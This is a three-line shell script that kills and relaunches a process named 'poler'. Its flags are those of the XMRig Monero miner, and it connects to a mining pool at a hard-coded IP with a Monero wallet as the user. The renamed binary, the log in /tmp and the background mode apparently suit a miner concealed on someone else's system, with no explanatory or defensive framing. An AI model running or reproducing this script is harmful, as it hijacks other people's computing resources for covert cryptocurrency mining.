pkill poler
sleep 7
poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 80 --cpu-priority 16 -o 109.234.36.164:5931 -u 498JGhAsSUrijASh6ixJoEX7pBef9qSfDjhdEaExrS48WtftLHBczDgJHVGiDdEU59ERbk5qAwLQiB38xACSiDFZCkva7xY --pass=sasasa:faker85552@gmail.com -k

